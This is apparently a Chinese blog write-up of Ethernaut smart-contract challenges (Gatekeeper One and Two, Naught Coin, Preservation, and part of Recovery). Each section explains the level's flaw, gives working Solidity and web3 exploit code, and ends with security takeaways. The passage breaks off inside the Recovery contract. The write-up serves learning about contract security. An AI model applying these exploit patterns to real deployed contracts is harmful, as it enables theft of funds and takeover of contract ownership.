<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line">contract SimpleContract &#123;</span><br><span class="line">    function add() public pure returns (uint) &#123;</span><br><span class="line">        uint a = 1; </span><br><span class="line">        uint b = 2; </span><br><span class="line">        return (a+b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开启debug，此时可以清晰的看到每一步汇编对应消耗的gas，例如操作码<code>ADD</code>消耗3gas</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/vOrAmj"><img src="https://s1.ax1x.com/2022/09/11/vOrAmj.png" alt="vOrAmj.png"></a></p>
<p>需要注意的是不同solidity编译器版本计算gas也不同。同时优化是否开启也会对gas的使用有影响。可以尝试更改设置中编译器默认值来查看剩余的gas如何变化。</p>
<p>接下来在看数据转换，每当将具有较大空间的数据点转换为一个较小空间的数据点时，数据就会丢失和损坏</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/vOrW38"><img src="https://s1.ax1x.com/2022/09/11/vOrW38.png" alt="vOrW38.png"></a></p>
<p>相反，如果想特意实现上述的结果，可以使用byte masking。solidity允许对字节和整数进行如下按位操作：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bytes4</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0xffffffff</span>;</span><br><span class="line"><span class="type">bytes4</span> <span class="variable">mask</span> <span class="operator">=</span> <span class="number">0xf0f0f0f0</span>;</span><br><span class="line"><span class="type">bytes4</span> <span class="variable">result</span> <span class="operator">=</span> a &amp; mask ;   <span class="comment">// 0xf0f0f0f0</span></span><br></pre></td></tr></table></figure>
<p>现在开始解决题目</p>
<p>gateone已经说了，然后先看gatethree</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br></pre></td></tr></table></figure>
<p>传进来的<code>_gateKey</code>数据类型为<code>bytes8</code>即8字节64位<br><code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)</code>，说明16~32位中间为0<br><code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code>说明高32位不全为0<br><code>uint32(uint64(_gateKey)) == uint16(tx.origin)</code></p>
<p>所以<code>bytes8 _dateKey = bytes8(uint64(tx.origin)) &amp; 0xFFFFFFFF0000FFFF</code></p>
<p>再看gatetwo，需要确保当调用栈执行到<code>msg.gas%8191</code>时剩余的gas是<code>8191</code>的整数倍</p>
<p>注意题目合约使用的是<code>version v0.6.0</code>并且没有开启优化，我们也要相应地对Remix进行设置。这一步比较坎坷，最后参考了这篇文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/love_wjk/article/details/107980505">https://blog.csdn.net/love_wjk/article/details/107980505</a></p>
<p>在代码中设置了gas还需要在metamask确定交易之前点击edit修改一下gas的limit，然后在<code>etherscan</code>上查看交易，进入debug trace。由于执行了<code>gasleft()</code>，我们查找GAS操作：获取剩余可执行燃料数，因为GAS本身也是指令会消耗gas，所以其下一条指令对应剩余的gas才是用来计算的值，即要让这个值模等于0。最后通过调整gas limit即可</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/vXLHzT"><img src="https://s1.ax1x.com/2022/09/12/vXLHzT.png" alt="vXLHzT.png"></a></p>
<p>如果函数执行失败overview会出现<code>Although one or more Error Occurred [**execution reverted**] Contract Execution Completed</code>，debug trace中会有指令<code>*REVERT</code></p>
<p>exp如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">  GatekeeperOne g = GatekeeperOne(0x726B380Df7930F41A4825c91A25c5852Cd4fcB9b);</span><br><span class="line">  bytes8 public key = bytes8(uint64(tx.origin))&amp; 0xFFFFFFFF0000FFFF;</span><br><span class="line">  function hack () public &#123;</span><br><span class="line">    address(g).call.gas(101779)(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, key));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>安全要点：</p>
<ul>
<li>不要在智能合约中断言gas的消耗，因为不同的编译器版本会造成不同的结果</li>
<li>转换数据类型为不同大小时要小新数据损坏</li>
<li>通过不存储不必要的值来节省gas。把一个值push到状态<code>MSTORE</code>、<code>MLOAD</code>总是比通过<code>SSTORE</code>、<code>SLOAD</code>把值存到区块链上气体密度更低</li>
<li>通过masking值（更少操作）而不是类型转换来节约gas</li>
</ul>
<h1 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先来点基础知识</p>
<p>黄皮书正式将合约创建定位为：</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/vjJVDP"><img src="https://s1.ax1x.com/2022/09/13/vjJVDP.png" alt="vjJVDP.png"></a></p>
<p>下面是一个简化的合约创建流程以及这些变量的含义：</p>
<p>首先一个创建合约的交易被发送到以太坊网络，这个交易包含输入变量，特别是：</p>
<ul>
<li><strong>Sender(s)</strong>：想要创建新合约的直接合约或外部钱包的地址</li>
<li><strong>Original transactor(o)</strong>：创建合约的原始外部钱包（一个用户）。注意如果用户使用一个工厂合约来创建更多合约时<code>o != s</code>。（工厂合约 factory contract指创建其他智能合约的智能合约）</li>
<li><strong>Available gas(g)</strong>：用户指定的，分配给创建合约的所有gas</li>
<li><strong>Gas price(p)</strong>：单位gas的市场价，将交易成本转换为以太币</li>
<li><strong>Endowment(v)</strong>：被transfer来seed新合约的价值（Wei为单位）。默认为0</li>
<li><strong>Initialzation EVM code(i)</strong>：新合约<code>constructor</code>函数和初始变量的所有内容，以字节码形式</li>
</ul>
<blockquote>
<p>注意，在第五步之前，新合约地址中不存在任何代码</p>
</blockquote>
<p>在黄皮书的脚注中：在初始化代码执行期间，地址上的EXTCODESIZE应该返回0，这是账户代码的长度，而CODESIZE应该返回初始化代码的长度</p>
<p>简单来说，如果尝试在一个合约创建之前检查其代码大小，将会得到一个空值。这是因为智能合约还没有被创，因此无法自我识别自己的代码大小。</p>
<p>solidity中支持以下逻辑门操作：</p>
<ul>
<li><code>&amp;</code>：and(x, y) 按位与</li>
<li><code>|</code>：or(x, y) 按位或</li>
<li><code>^</code>：xor(x, y)按位异或</li>
<li><code>~</code>：not(x, y)按位取反</li>
</ul>
<p>solidity中求幂使用<code>**</code></p>
<p>接下来看题</p>
<p><code>gateone</code>不多说了</p>
<p><code>gatethree</code>，</p>
<p><code>gatetwo</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assembly &#123; x := extcodesize(caller()) &#125;</span><br></pre></td></tr></table></figure><br>使用了<code>assembly</code>函数来检查调用合约的大小是否为0，也就是没有包含代码。但是调用合约必须首先要有代码才能调用GatekeeperTwo。<code>caller()</code>返回钱包/合约</p>
<p>回忆一下，当合约在构建期间，它通过其（预）计算地址部署代码，但该代码还没有与合约本身关联存储</p>
<p>这就意味着如果<code>extcodesizze</code>是一个位于sender合约的原始<code>constructor</code>函数中的子程序，<code>extcodesize(sender)</code>应该返回0</p>
<p>由上可以写出下面exp<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    GatekeeperTwo g = GatekeeperTwo(0x3e2748d17699CfC328C0320e4A36250b02b874f6);</span><br><span class="line">    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0)-1));</span><br><span class="line">    g.enter(key);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h1><p>引用的库文件编译版本对不上，用这里列出来了0.6.0的代码进行替换 <a target="_blank" rel="noopener" href="https://www.codenong.com/cs109703606/">https://www.codenong.com/cs109703606/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../ERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>ERCs（Ethereum Request for Comment）是允许在区块链上创建代币（tokens）的协议。具体来说，ERC20是一个定义了标准的合约接口</p>
<p>ERC20的安全问题：</p>
<ul>
<li><strong>Batchoverflow</strong>：因为ERC20没有强制使用SafeMath，可能会发生整数下溢。这就意味着当代币耗尽时，将会得到$ 2^{256} - 1 $个代币</li>
<li><p><strong>Transfer “bug”</strong>：ERC20的制造者希望开发者使用<code>approve()</code>和<code>transferfrom()</code>函数组合来移动代币。然而这一点在官方文件中没有清楚地声明，它们也没有警告不要使用<code>transfer()</code>（它仍然可以使用）。很多开发者用<code>transfer()</code>代替，造成了很多代币被永久锁定。<br>无法保证第三方合约会接收转账。如果将代币转到一个非接收方，这将导致永久丢失代币，因为代币合约已经扣去了账户的余额</p>
</li>
<li><p><strong>Poor ERC20 ingeritance</strong>：一些代币合约没有正确的实现ERC接口，造成很多问题。比如Golem’s GNT甚至没有实现重要的<code>approve()</code>函数，将<code>transfer()</code>作为唯一且有问题的选项</p>
</li>
</ul>
<blockquote>
<p>类似地，本题没有实现一些关键函数——造成Naughtcoin容易受到攻击</p>
</blockquote>
<p>注意：</p>
<ul>
<li>可以组合使用<code>transfer()</code>和<code>transferFrom()</code>来移动代币</li>
<li><code>lockTokens()</code>修饰符只用于<code>transfer()</code>函数</li>
<li><code>approve()</code>和<code>transferFrom()</code>函数在Remix IDE中都可用</li>
</ul>
<p>题目合约一个开始给player分配了<code>1000000</code>的代币，<code>timelock</code>定下的时间是现在之后的十年，显然无法通过判断。上述分析意味着可以使用推荐的<code>approve+transferfrom</code>组合来绕过<code>lockTokens()</code>将代币转走</p>
<p>检查账户余额，然后用自己的地址和外部账户来调用<code>approve()</code>。用1.player的地址2.一个任意外部钱包3.账户余额来调用<code>transferFrom()</code></p>
<p>相关的函数定义在这里 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/9b3710465583284b8c4c5d2245749246bb2e0094/contracts/token/ERC20/ERC20.sol">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/9b3710465583284b8c4c5d2245749246bb2e0094/contracts/token/ERC20/ERC20.sol</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* @dev Transfer token for a specified address</span><br><span class="line">* @param to The address to transfer to.</span><br><span class="line">* @param value The amount to be transferred.</span><br><span class="line">*/</span><br><span class="line">function transfer(address to, uint256 value) public returns (bool) &#123;</span><br><span class="line">  require(value &lt;= _balances[msg.sender]);</span><br><span class="line">  require(to != address(0));</span><br><span class="line"></span><br><span class="line">  _balances[msg.sender] = _balances[msg.sender].sub(value);</span><br><span class="line">  _balances[to] = _balances[to].add(value);</span><br><span class="line">  emit Transfer(msg.sender, to, value);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line"> * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.</span><br><span class="line"> * Beware that changing an allowance with this method brings the risk that someone may use both the old</span><br><span class="line"> * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this</span><br><span class="line"> * race condition is to first reduce the spender&#x27;s allowance to 0 and set the desired value afterwards:</span><br><span class="line"> * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span><br><span class="line"> * @param spender The address which will spend the funds.</span><br><span class="line"> * @param value The amount of tokens to be spent.</span><br><span class="line"> */</span><br><span class="line">function approve(address spender, uint256 value) public returns (bool) &#123;</span><br><span class="line">  require(spender != address(0));</span><br><span class="line"></span><br><span class="line">  _allowed[msg.sender][spender] = value;</span><br><span class="line">  emit Approval(msg.sender, spender, value);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line"> * @dev Transfer tokens from one address to another</span><br><span class="line"> * @param from address The address which you want to send tokens from</span><br><span class="line"> * @param to address The address which you want to transfer to</span><br><span class="line"> * @param value uint256 the amount of tokens to be transferred</span><br><span class="line"> */</span><br><span class="line">function transferFrom(</span><br><span class="line">  address from,</span><br><span class="line">  address to,</span><br><span class="line">  uint256 value</span><br><span class="line">)</span><br><span class="line">  public</span><br><span class="line">  returns (bool)</span><br><span class="line">&#123;</span><br><span class="line">  require(value &lt;= _balances[from]);</span><br><span class="line">  require(value &lt;= _allowed[from][msg.sender]);</span><br><span class="line">  require(to != address(0));</span><br><span class="line"></span><br><span class="line">  _balances[from] = _balances[from].sub(value);</span><br><span class="line">  _balances[to] = _balances[to].add(value);</span><br><span class="line">  _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);</span><br><span class="line">  emit Transfer(from, to, value);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line"> * @dev Internal function that mints an amount of the token and assigns it to</span><br><span class="line"> * an account. This encapsulates the modification of balances such that the</span><br><span class="line"> * proper events are emitted.</span><br><span class="line"> * @param account The account that will receive the created tokens.</span><br><span class="line"> * @param amount The amount that will be created.</span><br><span class="line"> */</span><br><span class="line">function _mint(address account, uint256 amount) internal &#123;</span><br><span class="line">  require(account != 0);</span><br><span class="line">  _totalSupply = _totalSupply.add(amount);</span><br><span class="line">  _balances[account] = _balances[account].add(amount);</span><br><span class="line">  emit Transfer(address(0), account, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从而写出exp<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">contrac.<span class="title function_">approve</span>(player, <span class="title function_">toWei</span>(<span class="string">&#x27;1000000&#x27;</span>))</span><br><span class="line">contract.<span class="title function_">transferFrom</span>(player, contract.<span class="property">address</span>, <span class="title function_">toWei</span>(<span class="string">&#x27;100000&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>安全思考</p>
<ul>
<li>当连接或实现ERC接口时，实现所有可用的函数</li>
<li>如果要创建自己的代币，考虑更新的协议如：ERC223、ERC721、ERC827</li>
<li>检查是否符合EIP165规定，它规定了哪一个接口是外部合约要实现的。相反，如果是发行代币的人，应该记住遵守EIP165</li>
<li>记住使用SafeMath来避免代币上溢/下溢</li>
</ul>
<h1 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>delegatecall()</code>可以保持调用合约数据上下文，来调用另一个合约的函数</li>
<li>该方法可以方便地使用一个合约作为库</li>
<li>这意味着可以让自己的恶意合约作为库来被<code>delegatecall()</code>调用，就可以操控调用合约的数据，特别是owner</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/vvlyj0"><img src="https://s1.ax1x.com/2022/09/14/vvlyj0.png" alt="vvlyj0.png"></a></p>
<p><code>delegatecall()</code>调用时上下文是调用合约，所以当被调用函数对存储状态进行修改时，代码看起来是在修改库中的数据，实际上修改的是调用合约中的数据，将按照存储对应。所以本题中第一次调用<code>setTime</code>修改时间时，修改<code>sotredTime</code>实际上改掉的是题目合约中的外部库地址<code>timeZone1Library</code>。</p>
<p>由此可以部署一个恶意合约，内部包含一个同样具有一个函数<code>setTime</code>用来修改数据，并且可以知道<code>owner</code>位于原合约存储中的slot2，所以恶意合约中让可以被修改的<code>sotredTime</code>也位于slot2，这样在实际调用的时候原合约中的owner就会被修改为任意值</p>
<p>exp如下<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract badcontract &#123;</span><br><span class="line">  address <span class="keyword">public</span> timeZone1Library;</span><br><span class="line">  address <span class="keyword">public</span> timeZone2Library;</span><br><span class="line">  <span class="built_in">uint</span> storedTime;</span><br><span class="line">  address <span class="keyword">public</span> owner; </span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">setTime</span>(<span class="params"><span class="built_in">uint</span> _time</span>) <span class="keyword">public</span></span> &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = web3.<span class="property">utils</span>.<span class="title function_">padLeft</span>(<span class="string">&#x27;0x159c8E5850546B2D2c53220228a67B38Bf78A6e2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">contract.<span class="title function_">setFirstTime</span>(p)</span><br><span class="line"><span class="keyword">let</span> p = web3.<span class="property">utils</span>.<span class="title function_">padLeft</span>(player, <span class="number">64</span>)</span><br><span class="line">contract.<span class="title function_">setFirstTime</span>(p)</span><br></pre></td></tr></table></figure>
<p>还看到有的做法是在函数中直接使用<code>owner = msg.sender()</code>进行修改</p>
<p>安全思考</p>
<ul>
<li>理想情况下，外部库不应该存储状态</li>
<li>创建库的时候使用<code>libbrary</code>而不是<code>contract</code>，确保调用者使用<code>delegatecall()</code>调用库函数时，库不会修改调用者自身的数据</li>
<li>使用更高级别的函数从库继承，特别是当1.不需要修改合约存储时2.不需要控制gas</li>
</ul>
<h1 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span 